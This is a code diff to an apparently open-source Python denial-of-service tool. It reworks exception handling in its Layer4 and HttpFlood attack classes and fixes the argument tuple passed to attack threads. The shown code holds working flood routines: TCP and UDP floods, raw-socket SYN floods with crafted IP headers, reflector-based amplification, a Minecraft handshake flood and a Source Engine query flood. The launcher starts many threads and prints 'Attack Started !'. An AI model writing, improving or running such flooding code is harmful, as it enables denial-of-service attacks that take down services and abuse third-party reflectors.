@@ -77,6 +77,7 @@ class Tools:
             return num
 
 
+# noinspection PyBroadException
 class Layer4:
     _method: str
     _target: Tuple[str, int]
@@ -94,15 +95,14 @@ class Layer4:
         self._method = method
         self._target = target
         self._synevent = synevent
+
         self.run()
 
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
         while 1:
-            with suppress(Exception):
-                while 1:
-                    self.SENT_FLOOD()
+            self.SENT_FLOOD()
 
     def select(self, name):
         self.SENT_FLOOD = self.TCP
@@ -137,44 +137,62 @@ class Layer4:
             self._amp_payloads = cycle(self._generate_amp())
 
     def TCP(self) -> None:
-        with socket(AF_INET, SOCK_STREAM) as s:
-            s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-            s.connect(self._target)
-            while s.send(randbytes(1024)):
-                continue
+        try:
+            with socket(AF_INET, SOCK_STREAM) as s:
+                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+                s.connect(self._target)
+                while s.send(randbytes(1024)):
+                    continue
+        except Exception:
+            s.close()
 
     def MINECRAFT(self) -> None:
-        with socket(AF_INET, SOCK_STREAM) as s:
-            s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-            s.connect(self._target)
+        try:
+            with socket(AF_INET, SOCK_STREAM) as s:
+                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+                s.connect(self._target)
 
-            s.send(b'\x0f\x1f0\t' + self._target[0].encode() + b'\x0fA')
+                s.send(b'\x0f\x1f0\t' + self._target[0].encode() + b'\x0fA')
 
-            while s.send(b'\x01'):
-                s.send(b'\x00')
+                while s.send(b'\x01'):
+                    s.send(b'\x00')
+        except Exception:
+            s.close()
 
     def UDP(self) -> None:
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            while s.sendto(randbytes(1024), self._target):
-                continue
+        try:
+            with socket(AF_INET, SOCK_DGRAM) as s:
+                while s.sendto(randbytes(1024), self._target):
+                    continue
+        except Exception:
+            s.close()
 
     def SYN(self) -> None:
-        with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
-            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while s.sendto(self._genrate_syn(), self._target):
-                continue
+        try:
+            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+                while s.sendto(self._genrate_syn(), self._target):
+                    continue
+        except Exception:
+            s.close()
 
     def AMP(self) -> None:
-        with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
-            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while s.sendto(*next(self._amp_payloads)):
-                continue
+        try:
+            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+                while s.sendto(*next(self._amp_payloads)):
+                    continue
+        except Exception:
+            s.close()
 
     def VSE(self) -> None:
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            while s.sendto((b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
-                            b'\x20\x51\x75\x65\x72\x79\x00'), self._target):
-                continue
+        try:
+            with socket(AF_INET, SOCK_DGRAM) as s:
+                while s.sendto((b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
+                                b'\x20\x51\x75\x65\x72\x79\x00'), self._target):
+                    continue
+        except Exception:
+            s.close()
 
     def _genrate_syn(self) -> bytes:
         ip: IP = IP()
@@ -273,9 +291,7 @@ class HttpFlood:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
         while 1:
-            with suppress(Exception):
-                while 1:
-                    self.SENT_FLOOD()
+            self.SENT_FLOOD()
 
     @property
     def SpoofIP(self) -> str:
@@ -952,7 +968,7 @@ if __name__ == '__main__':
                         if not ref: exit("Empty Reflector File ")
 
                     for _ in range(threads):
-                        Thread(target=Layer4, args=(((target, port), ref, method, event),), daemon=True).start()
+                        Thread(target=Layer4, args=((target, port), ref, method, event,), daemon=True).start()
 
                 print("Attack Started !")
                 event.set()
